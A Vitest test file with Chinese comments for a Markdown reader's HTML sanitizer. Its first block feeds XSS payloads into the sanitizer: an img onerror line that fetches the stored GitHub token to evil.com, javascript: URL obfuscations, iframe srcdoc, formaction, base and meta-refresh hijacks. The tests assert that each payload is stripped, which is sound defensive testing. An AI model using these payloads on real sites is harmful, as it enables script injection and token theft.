import { describe, expect, it } from 'vitest'
import { sanitizeMarkdownHtml, sanitizeRichText } from './sanitize'

/*
 * 这些用例锁定的是安全边界，不是实现细节。
 *
 * 背景：Markdown 阅读器的正文可来自 ?c= / ?gist=（任意人可构造），
 * 而 marked v5+ 不再内建 sanitize。一旦净化层退化，
 * 一条 <img src=x onerror=...> 即可读取同源存储中的 GitHub Token。
 * 因此每个「拦截」用例都对应一个真实攻击向量。
 */

const TOKEN_KEY = 'md-reader:gist-token'

describe('sanitizeMarkdownHtml - 拦截攻击向量', () => {
  const vectors: Array<[string, string]> = [
    ['img onerror 窃取 Token', `<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('${TOKEN_KEY}'))">`],
    ['script 直接注入', `<script>alert(1)</script>`],
    ['svg onload', `<svg onload="alert(1)"></svg>`],
    ['javascript: 协议', `<a href="javascript:alert(1)">x</a>`],
    ['大小写混淆协议', `<a href="JaVaScRiPt:alert(1)">x</a>`],
    ['内嵌 tab 绕过', `<a href="java&#9;script:alert(1)">x</a>`],
    ['iframe srcdoc', `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
    ['body onload', `<body onload="alert(1)">`],
    ['form + formaction', `<form action="https://evil.com"><button formaction="https://evil.com">go</button></form>`],
    ['base 标签劫持', `<base href="https://evil.com/">`],
    ['object 注入', `<object data="javascript:alert(1)"></object>`],
    ['details ontoggle', `<details ontoggle="alert(1)" open>x</details>`],
    ['video source onerror', `<video><source onerror="alert(1)"></video>`],
    ['heading 属性走私', `<h1 onmouseover="alert(1)">t</h1>`],
    ['meta refresh 跳转', `<meta http-equiv="refresh" content="0;url=https://evil.com">`],
    // style 除 CSS 注入外，还可用 position:fixed 铺满视口做点击劫持
    ['style 属性', `<div style="position:fixed;inset:0">x</div>`],
  ]

  it.each(vectors)('拦截：%s', (_name, payload) => {
    const out = sanitizeMarkdownHtml(payload).toLowerCase()

    expect(out).not.toMatch(/\bon[a-z]+\s*=/)
    expect(out).not.toContain('<script')
    expect(out).not.toContain('javascript:')
    expect(out).not.toContain('srcdoc')
    expect(out).not.toContain('formaction')
    expect(out).not.toContain('<base')
    expect(out).not.toContain('<object')
    expect(out).not.toContain('<iframe')
    expect(out).not.toContain('http-equiv')
    expect(out).not.toMatch(/\sstyle\s*=/)
  })
})

describe('sanitizeMarkdownHtml - 保留正常内容', () => {
  it('保留标题及其 id（目录锚点依赖）', () => {
    const out = sanitizeMarkdownHtml('<h1 id="toc-heading-0">标题</h1>')
    expect(out).toContain('id="toc-heading-0"')
    expect(out).toContain('标题')
  })

  it('保留基本排版元素', () => {
    const out = sanitizeMarkdownHtml('<p><strong>粗</strong><em>斜</em><del>删</del></p>')
    expect(out).toContain('<strong>')
    expect(out).toContain('<em>')
  })

  it('保留代码块与语言类名', () => {
    const out = sanitizeMarkdownHtml('<pre><code class="language-js">const a=1</code></pre>')
    expect(out).toContain('language-js')
  })

  it('保留表格', () => {
    const out = sanitizeMarkdownHtml('<table><tbody><tr><th>A</th><td>B</td></tr></tbody></table>')
    expect(out).toContain('<table>')
    expect(out).toContain('<td>')
  })

  it('保留安全链接与图片', () => {
    expect(sanitizeMarkdownHtml('<a href="https://example.com">l</a>')).toContain('href="https://example.com"')
    expect(sanitizeMarkdownHtml('<img src="https://example.com/a.png" alt="x">')).toContain('src="https://example.com/a.png"')
  })

  it('外链自动补 rel，防止 reverse tabnabbing', () => {
    const out = sanitizeMarkdownHtml('<a href="https://example.com">l</a>')
    expect(out).toContain('noopener')
  })

  it('保留 mermaid 容器供后续渲染定位', () => {
    const out = sanitizeMarkdownHtml('<div class="mermaid">graph TD; A--&gt;B;</div>')
    expect(out).toContain('class="mermaid"')
  })

  it('保留 kroki 容器与 data-diagram-type', () => {
    const out = sanitizeMarkdownHtml('<div class="kroki-diagram" data-diagram-type="plantuml"><pre class="kroki-source">@startuml</pre></div>')
    expect(out).toContain('data-diagram-type="plantuml"')
  })

  it('保留 mermaid 产出的内联 SVG 及其表现属性', () => {
    const svg = '<svg viewBox="0 0 100 100"><g transform="translate(1,2)"><path d="M0 0 L10 10" stroke="#333" fill="none"/><text x="5" y="5" font-size="12">n</text></g></svg>'
    const out = sanitizeMarkdownHtml(svg)
    expect(out).toContain('<svg')
    expect(out).toContain('<path')
    expect(out).toMatch(/viewbox|viewBox/i)
    expect(out).toContain('stroke')
  })

  it('保留 callout / 代码 chrome 的 data 属性', () => {
    const out = sanitizeMarkdownHtml(
      '<aside class="md-callout" data-callout="note"><div class="md-callout-title">Note</div></aside>' +
      '<div class="md-code-block" data-lang="cpp"><span class="md-code-copy" role="button" tabindex="0">复制</span></div>',
    )
    expect(out).toContain('data-callout="note"')
    expect(out).toContain('data-lang="cpp"')
    expect(out).toContain('role="button"')
  })
})

describe('sanitizeRichText', () => {
  it('同样拦截脚本与内联事件', () => {
    expect(sanitizeRichText('<script>alert(1)</script>')).not.toContain('<script')
    expect(sanitizeRichText('<img src=x onerror="alert(1)">')).not.toMatch(/\bon[a-z]+\s*=/i)
  })

  it('保留普通排版', () => {
    expect(sanitizeRichText('<p><strong>x</strong></p>')).toContain('<strong>')
  })
})
